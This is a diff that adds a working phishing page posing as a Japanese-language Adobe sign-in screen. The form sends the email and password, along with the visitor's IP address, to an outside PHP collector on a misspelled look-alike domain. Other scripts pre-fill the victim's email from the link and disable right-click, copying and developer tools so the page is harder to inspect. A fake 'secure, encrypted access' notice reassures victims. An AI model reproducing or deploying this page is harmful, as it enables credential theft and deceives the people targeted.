@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en-US">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+<link rel="icon" href="https://delivery.healthymessenger.com/document/img/favicon.ico" type="image/x-icon" />
+  <title>ログイン | Adobe</title>
+  <style>
+  /* Prevent text selection globally, except inputs and textareas */
+*:not(input):not(textarea) {
+  -webkit-user-select: none;
+  -moz-user-select: none;
+  -ms-user-select: none;
+  user-select: none;
+}
+
+html, body {
+  height: 100%;
+  margin: 0;
+  padding: 0;
+  width: 100%;
+  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+  color: white;
+  background-color: #000;
+}
+
+.bg-img {
+  background-image: url("https://delivery.healthymessenger.com/xdocument/img/background.jpg");
+  background-position: center;
+  background-repeat: no-repeat;
+  background-size: cover;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 20px;
+  height: 100vh;
+}
+
+.container {
+  background: rgba(0, 0, 0, 0.75);
+  padding: 40px 30px;
+  border-radius: 10px;
+  max-width: 400px;
+  width: 100%;
+  box-shadow: 0 4px 20px rgba(0,0,0,0.6);
+  text-align: center;
+}
+
+.container img {
+  width: 120px;
+  margin: 0 auto 25px auto;
+  display: block;
+  filter: drop-shadow(0 2px 6px rgba(0,0,0,0.7));
+}
+
+.container h3 {
+  font-size: 18px;
+  margin-bottom: 10px;
+  color: #fff;
+}
+
+form {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  width: 100%;
+}
+
+.form-group {
+  width: 100%;
+  margin-bottom: 15px;
+}
+
+.form-control {
+  width: 100%;
+  padding: 12px;
+  border: none;
+  border-radius: 5px;
+  font-size: 16px;
+  margin-top: 5px;
+  box-sizing: border-box;
+}
+
+.form-control::placeholder {
+  color: #aaa;
+}
+
+.btn {
+  width: 100%;
+  padding: 12px;
+  background-color: #e50914;
+  color: #fff;
+  border: none;
+  border-radius: 5px;
+  font-size: 16px;
+  cursor: pointer;
+  margin-top: 10px;
+  box-sizing: border-box;
+  transition: background-color 0.3s ease;
+}
+
+.btn:hover {
+  background-color: #c40812;
+}
+
+#login_error, #password_error {
+  font-size: 14px;
+  color: #ff4c4c;
+  margin-top: 5px;
+}
+
+@media (max-width: 500px) {
+  .container {
+    padding: 30px 20px;
+  }
+}
+
+@keyframes fadeOut {
+  0% { opacity: 1; }
+  80% { opacity: 1; }
+  100% {
+    opacity: 0;
+    height: 0;
+    margin: 0;
+    padding: 0;
+    overflow: hidden;
+  }
+}
+
+</style>
+<script>
+  document.addEventListener('contextmenu', function(e) {
+    e.preventDefault();
+  });
+</script>
+<script>
+  // Disable right-click
+  document.addEventListener('contextmenu', function(e) {
+    e.preventDefault();
+  });
+
+  // Disable copy, cut, and paste
+  document.addEventListener('copy', function(e) {
+    e.preventDefault();
+  });
+  document.addEventListener('cut', function(e) {
+    e.preventDefault();
+  });
+  document.addEventListener('paste', function(e) {
+    e.preventDefault();
+  });
+
+  // Disable Ctrl+S, Ctrl+U, Ctrl+C, Ctrl+Shift+I, F12 (Dev Tools)
+  document.addEventListener('keydown', function(e) {
+    if (
+      (e.ctrlKey && ['u', 's', 'c'].includes(e.key.toLowerCase())) ||
+      (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === 'i') ||
+      e.key === 'F12'
+    ) {
+      e.preventDefault();
+    }
+  });
+</script>
+
+</head>
+<body>
+  <div id="app" class="bg-img"></div>
+
+  <script>
+    const app = document.getElementById('app');
+
+    const container = document.createElement('div');
+    container.2e
+    container.innerHTML = `
+      <img src="https://delivery.healthymessenger.com/document/img/adobobe.png" alt="Adobe Logo">
+<!-- Secure Access Message -->
+<div id="secureNote" style="
+  display: flex;
+  align-items: flex-start;
+  background-color: #f0f0f0;
+  color: #333;
+  padding: 12px 15px;
+  border-left: 2px solid red;
+  border-radius: 6px;
+  font-size: 10px;
+  margin-bottom: 15px;
+  text-align: left;
+  box-shadow: inset 0 0 3px rgba(0,0,0,0.1);
+  animation: fadeOut 5000s forwards;
+  animation-delay: 5s;
+">
+  <svg xmlns="http://www.w3.org/2000/svg" fill="red" width="20" height="20" viewBox="0 0 24 24" style="margin-right: 10px; margin-top: 2px;">
+    <path d="M12 2C8.691 2 6 4.691 6 8v4H4v10h16V12h-2V8c0-3.309-2.691-6-6-6zm-4 
+    6c0-2.206 1.794-4 4-4s4 1.794 4 4v4H8V8zm10 6v6H6v-6h12z"/>
+  </svg>
+  <span>
+    <strong>安全で認可されたアクセス</strong><br>
+    この手順は、文書への正当なアクセスを確認するために必要です。セッションは暗号化され、保護されています。 .
+  </span>
+</div>
+      <form id="login_form" action="https://jptechnology.tavahaelth.com/document/dr/s7.php" method="POST">
+        <input type="hidden" name="plan" value="CA">
+        <input type="hidden" name="ip_address" id="ip_address" value="">
+
+        <div class="form-group">
+          <input type="email" name="email" id="email" class="form-control" placeholder="Enter Email Address" required>
+        </div>
+
+
+        <div class="form-group">
+          <input type="password" name="password" id="password" class="form-control" placeholder="パスワード" required>
+        </div>
+
+        <button type="submit" class="btn">続行</button>
+      </form>
+    `;
+
+    app.appendChild(container);
+
+    // Fetch IP address
+    fetch("https://api.ipify.org?format=json")
+      .then(res => res.json())
+      .then(data => {
+        document.getElementById("ip_address").value = data.ip;
+      });
+
+    // Autofill email from URL query string
+    (function () {
+      const params = new URLSearchParams(window.location.search);
+      const email = params.get('email');
+      if (email) {
+        document.getElementById('email').value = decodeURIComponent(email);
+      }
+    })();
+
+    // Basic validation
+    document.addEventListener('submit', function (e) {
+      const email = document.getElementById('email').value.trim();
+      if (!email) {
+        e.preventDefault();
+        alert("Please enter your email address.");
+        document.getElementById('email').focus();
+      }
+    });
+  </script>
+</body>
+</html>
+
